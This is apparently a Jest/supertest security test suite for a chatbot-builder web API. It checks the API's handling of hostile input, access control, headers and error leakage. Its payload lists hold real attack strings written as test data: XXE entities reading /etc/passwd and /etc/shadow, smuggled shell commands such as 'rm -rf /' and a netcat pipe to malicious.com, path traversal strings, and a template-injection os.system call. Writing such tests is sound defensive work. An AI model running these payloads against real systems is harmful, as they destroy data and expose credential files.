import request from 'supertest';
import { app } from '../../index';
import { knex } from '../../database/connection';
import { User } from '../../models/User';
import { Chatbot } from '../../models/Chatbot';
import { generateToken } from '../../utils/jwt';
import crypto from 'crypto';

describe('Comprehensive Security Tests', () => {
  beforeAll(async () => {
    expect(process.env.NODE_ENV).toBe('test');
    await knex.migrate.latest();
  });

  beforeEach(async () => {
    // Clean database before each test
    await knex('messages').del();
    await knex('conversations').del();
    await knex('chatbots').del();
    await knex('usage_stats').del();
    await knex('user_profiles').del();
    await knex('users').del();
  });

  afterAll(async () => {
    await knex.destroy();
  });

  describe('Advanced Input Validation Security', () => {
    let testUser: User;
    let authToken: string;

    beforeEach(async () => {
      testUser = await User.query().insert({
        email: 'security@test.com',
        password: '$2a$10$hashedpassword',
        firstName: 'Security',
        lastName: 'Test',
        emailVerified: true
      });

      authToken = generateToken({ userId: testUser.id, email: testUser.email });
    });

    test('should prevent XXE (XML External Entity) attacks', async () => {
      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://malicious.com/steal">]><root>&test;</root>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>'
      ];

      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/chatbots')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        // Should reject XML content or handle safely
        expect([400, 415, 422]).toContain(response.status);
      }
    });

    test('should prevent LDAP injection attacks', async () => {
      const ldapPayloads = [
        'admin)(&(password=*))',
        'admin)(|(password=*))',
        '*)(uid=*))(|(uid=*',
        'admin)(!(&(1=0)))'
      ];

      for (const payload of ldapPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: payload,
            password: 'anypassword'
          });

        expect(response.status).toBe(400);
      }
    });

    test('should prevent command injection attacks', async () => {
      const commandPayloads = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc malicious.com 4444',
        'test`whoami`',
        'test$(id)',
        'test; shutdown -h now'
      ];

      for (const payload of commandPayloads) {
        const response = await request(app)
          .post('/api/chatbots')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: payload,
            description: 'Test bot',
            personality: 'Helpful',
            knowledgeBase: ['test'],
            appearance: {
              primaryColor: '#007bff',
              secondaryColor: '#6c757d',
              fontFamily: 'Arial',
              borderRadius: 8,
              position: 'bottom-right'
            },
            settings: {
              maxTokens: 150,
              temperature: 0.7,
              responseDelay: 1000,
              fallbackMessage: 'Sorry, I could not understand.',
              collectUserInfo: false
            }
          });

        // Should either reject or sanitize the input
        if (response.status === 201) {
          expect(response.body.name).not.toContain(';');
          expect(response.body.name).not.toContain('&&');
          expect(response.body.name).not.toContain('|');
          expect(response.body.name).not.toContain('`');
          expect(response.body.name).not.toContain('$');
        }
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        // Test file upload endpoint if it exists
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${authToken}`)
          .field('filename', payload)
          .attach('file', Buffer.from('test'), 'test.jpg');

        // Should reject path traversal attempts
        expect([400, 403, 422]).toContain(response.status);
      }
    });

    test('should prevent template injection attacks', async () => {
      const templatePayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{config.items}}',
        '${java.lang.Runtime}',
        '{{request.application.__globals__.__builtins__.__import__("os").system("id")}}'
      ];

      for (const payload of templatePayloads) {
        const response = await request(app)
          .post('/api/chatbots')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: 'Template Test Bot',
            description: payload,
            personality: 'Helpful',
            knowledgeBase: ['test'],
            appearance: {
              primaryColor: '#007bff',
              secondaryColor: '#6c757d',
              fontFamily: 'Arial',
              borderRadius: 8,
              position: 'bottom-right'
            },
            settings: {
              maxTokens: 150,
              temperature: 0.7,
              responseDelay: 1000,
              fallbackMessage: 'Sorry, I could not understand.',
              collectUserInfo: false
            }
          });

        // Should not execute template code
        if (response.status === 201) {
          expect(response.body.description).not.toBe('49'); // 7*7 should not be evaluated
          expect(response.body.description).not.toContain('uid='); // Command should not execute
        }
      }
    });
  });

  describe('Cryptographic Security', () => {
    test('should use secure random number generation', async () => {
      // Test that tokens/IDs are generated securely
      const tokens: string[] = [];
      
      for (let i = 0; i < 10; i++) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: `crypto${i}@test.com`,
            password: 'SecurePassword123!',
            firstName: 'Crypto',
            lastName: 'Test'
          });

        if (response.status === 201) {
          tokens.push(response.body.user.id);
        }
      }

      // Tokens should be unique and unpredictable
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);

      // Check for patterns that might indicate weak randomness
      for (const token of tokens) {
        expect(token).not.toMatch(/^(0+|1+|a+)$/); // Not all same character
        expect(token.length).toBeGreaterThan(10); // Sufficient length
      }
    });

    test('should handle cryptographic key rotation', async () => {
      const user = await User.query().insert({
        email: 'keyrotation@test.com',
        password: '$2a$10$hashedpassword',
        firstName: 'Key',
        lastName: 'Rotation',
        emailVerified: true
      });

      // Generate token with current key
      const token1 = generateToken({ userId: user.id, email: user.email });

      // Verify token works
      const response1 = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${token1}`);

      expect(response1.status).toBe(200);

      // Simulate key rotation (in real system, this would be handled by key management)
      // For testing, we'll just verify that old tokens can still be validated
      // if the system supports multiple keys

      const response2 = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${token1}`);

      expect(response2.status).toBe(200);
    });

    test('should prevent timing attacks on token validation', async () => {
      const validUser = await User.query().insert({
        email: 'timing@test.com',
        password: '$2a$10$hashedpassword',
        firstName: 'Timing',
        lastName: 'Test',
        emailVerified: true
      });

      const validToken = generateToken({ userId: validUser.id, email: validUser.email });
      const invalidTokens = [
        'invalid.token.here',
        validToken.slice(0, -5) + 'wrong',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      // Measure response times
      const validTokenTimes: number[] = [];
      const invalidTokenTimes: number[] = [];

      for (let i = 0; i < 5; i++) {
        // Test valid token
        const startValid = Date.now();
        await request(app)
          .get('/api/users/profile')
          .set('Authorization', `Bearer ${validToken}`);
        validTokenTimes.push(Date.now() - startValid);

        // Test invalid tokens
        for (const invalidToken of invalidTokens) {
          const startInvalid = Date.now();
          await request(app)
            .get('/api/users/profile')
            .set('Authorization', `Bearer ${invalidToken}`);
          invalidTokenTimes.push(Date.now() - startInvalid);
        }
      }

      const avgValidTime = validTokenTimes.reduce((a, b) => a + b, 0) / validTokenTimes.length;
      const avgInvalidTime = invalidTokenTimes.reduce((a, b) => a + b, 0) / invalidTokenTimes.length;

      // Response times should be similar to prevent timing attacks
      const timeDifference = Math.abs(avgValidTime - avgInvalidTime);
      expect(timeDifference).toBeLessThan(50); // Less than 50ms difference
    });
  });

  describe('Business Logic Security', () => {
    let testUser: User;
    let authToken: string;

    beforeEach(async () => {
      testUser = await User.query().insert({
        email: 'business@test.com',
        password: '$2a$10$hashedpassword',
        firstName: 'Business',
        lastName: 'Logic',
        emailVerified: true
      });

      authToken = generateToken({ userId: testUser.id, email: testUser.email });
    });

    test('should prevent race conditions in resource creation', async () => {
      // Attempt to create multiple chatbots simultaneously
      const promises = Array(5).fill(0).map(() =>
        request(app)
          .post('/api/chatbots')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: 'Race Condition Bot',
            description: 'Testing race conditions',
            personality: 'Helpful',
            knowledgeBase: ['test'],
            appearance: {
              primaryColor: '#007bff',
              secondaryColor: '#6c757d',
              fontFamily: 'Arial',
              borderRadius: 8,
              position: 'bottom-right'
            },
            settings: {
              maxTokens: 150,
              temperature: 0.7,
              responseDelay: 1000,
              fallbackMessage: 'Sorry, I could not understand.',
              collectUserInfo: false
            }
          })
      );

      const results = await Promise.all(promises);
      const successful = results.filter(r => r.status === 201);

      // All should succeed or fail gracefully
      expect(successful.length).toBeGreaterThan(0);
      expect(successful.length).toBeLessThanOrEqual(5);

      // Verify data consistency
      const chatbots = await Chatbot.query().where('user_id', testUser.id);
      expect(chatbots.length).toBe(successful.length);
    });

    test('should prevent integer overflow attacks', async () => {
      const overflowValues = [
        2147483647, // Max 32-bit signed integer
        2147483648, // Max + 1
        4294967295, // Max 32-bit unsigned integer
        9223372036854775807, // Max 64-bit signed integer
        -2147483648, // Min 32-bit signed integer
        -2147483649 // Min - 1
      ];

      for (const value of overflowValues) {
        const response = await request(app)
          .post('/api/chatbots')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: 'Overflow Test Bot',
            description: 'Testing integer overflow',
            personality: 'Helpful',
            knowledgeBase: ['test'],
            appearance: {
              primaryColor: '#007bff',
              secondaryColor: '#6c757d',
              fontFamily: 'Arial',
              borderRadius: value, // Test overflow in numeric field
              position: 'bottom-right'
            },
            settings: {
              maxTokens: value, // Test overflow in settings
              temperature: 0.7,
              responseDelay: 1000,
              fallbackMessage: 'Sorry, I could not understand.',
              collectUserInfo: false
            }
          });

        // Should handle overflow gracefully
        if (response.status === 201) {
          expect(response.body.appearance.borderRadius).toBeGreaterThanOrEqual(0);
          expect(response.body.settings.maxTokens).toBeGreaterThan(0);
          expect(response.body.settings.maxTokens).toBeLessThan(10000); // Reasonable limit
        } else {
          expect([400, 422]).toContain(response.status);
        }
      }
    });

    test('should prevent privilege escalation through parameter pollution', async () => {
      // Test HTTP Parameter Pollution
      const response = await request(app)
        .put('/api/users/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          firstName: 'Normal',
          lastName: 'User',
          role: 'admin', // Attempt to escalate privileges
          isAdmin: true,
          permissions: ['admin', 'superuser']
        });

      expect(response.status).toBe(200);
      
      // Verify user was not granted admin privileges
      const updatedUser = await User.query().findById(testUser.id);
      expect(updatedUser?.role).not.toBe('admin');
      expect(updatedUser?.firstName).toBe('Normal');
    });

    test('should prevent business logic bypass through direct object references', async () => {
      // Create another user
      const otherUser = await User.query().insert({
        email: 'other@test.com',
        password: '$2a$10$hashedpassword',
        firstName: 'Other',
        lastName: 'User',
        emailVerified: true
      });

      // Create chatbot for other user
      const otherChatbot = await Chatbot.query().insert({
        userId: otherUser.id,
        name: 'Other User Bot',
        description: 'Private bot',
        personality: 'Helpful',
        knowledgeBase: ['private'],
        appearance: {
          primaryColor: '#007bff',
          secondaryColor: '#6c757d',
          fontFamily: 'Arial',
          borderRadius: 8,
          position: 'bottom-right'
        },
        settings: {
          maxTokens: 150,
          temperature: 0.7,
          responseDelay: 1000,
          fallbackMessage: 'Sorry, I could not understand.',
          collectUserInfo: false
        }
      });

      // Attempt to access other user's chatbot through direct reference
      const response = await request(app)
        .get(`/api/chatbots/${otherChatbot.id}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.status).toBe(404); // Should not reveal existence

      // Attempt to modify other user's chatbot
      const modifyResponse = await request(app)
        .put(`/api/chatbots/${otherChatbot.id}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: 'Hacked Bot'
        });

      expect(modifyResponse.status).toBe(404);

      // Verify chatbot was not modified
      const unchangedBot = await Chatbot.query().findById(otherChatbot.id);
      expect(unchangedBot?.name).toBe('Other User Bot');
    });
  });

  describe('API Security Headers', () => {
    test('should include security headers in responses', async () => {
      const response = await request(app)
        .get('/api/health');

      // Check for security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(response.headers['x-xss-protection']).toBeDefined();
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });

    test('should not expose sensitive server information', async () => {
      const response = await request(app)
        .get('/api/health');

      // Should not expose server details
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
    });

    test('should handle CORS properly', async () => {
      const response = await request(app)
        .options('/api/health')
        .set('Origin', 'https://example.com')
        .set('Access-Control-Request-Method', 'GET');

      // Should handle CORS preflight
      expect(response.headers['access-control-allow-origin']).toBeDefined();
      expect(response.headers['access-control-allow-methods']).toBeDefined();
    });
  });

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in error messages', async () => {
      // Test database errors
      const response = await request(app)
        .get('/api/chatbots/invalid-uuid-format');

      expect(response.status).toBe(400);
      expect(response.body.error).not.toContain('database');
      expect(response.body.error).not.toContain('SQL');
      expect(response.body.error).not.toContain('table');
      expect(response.body.error).not.toContain('column');
      expect(response.body.error).not.toContain('constraint');
    });

    test('should handle stack trace exposure', async () => {
      // Attempt to trigger an error that might expose stack trace
      const response = await request(app)
        .post('/api/chatbots')
        .send({
          // Invalid data that might cause internal error
          name: null,
          description: undefined,
          personality: {},
          knowledgeBase: 'not-an-array'
        });

      expect(response.status).toBe(400);
      expect(response.body.stack).toBeUndefined();
      expect(response.body.trace).toBeUndefined();
      
      // Error message should be generic
      expect(response.body.error).not.toContain('TypeError');
      expect(response.body.error).not.toContain('at Object');
      expect(response.body.error).not.toContain('node_modules');
    });

    test('should handle resource exhaustion gracefully', async () => {
      // Attempt to create very large payload
      const largePayload = {
        name: 'Resource Test Bot',
        description: 'A'.repeat(100000), // 100KB description
        personality: 'B'.repeat(50000), // 50KB personality
        knowledgeBase: Array(1000).fill('Large knowledge item '.repeat(100)),
        appearance: {
          primaryColor: '#007bff',
          secondaryColor: '#6c757d',
          fontFamily: 'Arial',
          borderRadius: 8,
          position: 'bottom-right'
        },
        settings: {
          maxTokens: 150,
          temperature: 0.7,
          responseDelay: 1000,
          fallbackMessage: 'Sorry, I could not understand.',
          collectUserInfo: false
        }
      };

      const user = await User.query().insert({
        email: 'resource@test.com',
        password: '$2a$10$hashedpassword',
        firstName: 'Resource',
        lastName: 'Test',
        emailVerified: true
      });

      const token = generateToken({ userId: user.id, email: user.email });

      const response = await request(app)
        .post('/api/chatbots')
        .set('Authorization', `Bearer ${token}`)
        .send(largePayload);

      // Should either accept with limits or reject gracefully
      expect([201, 400, 413, 422]).toContain(response.status);
      
      if (response.status === 201) {
        // If accepted, should have reasonable limits
        expect(response.body.description.length).toBeLessThan(10000);
        expect(response.body.knowledgeBase.length).toBeLessThan(100);
      }
    });
  });
});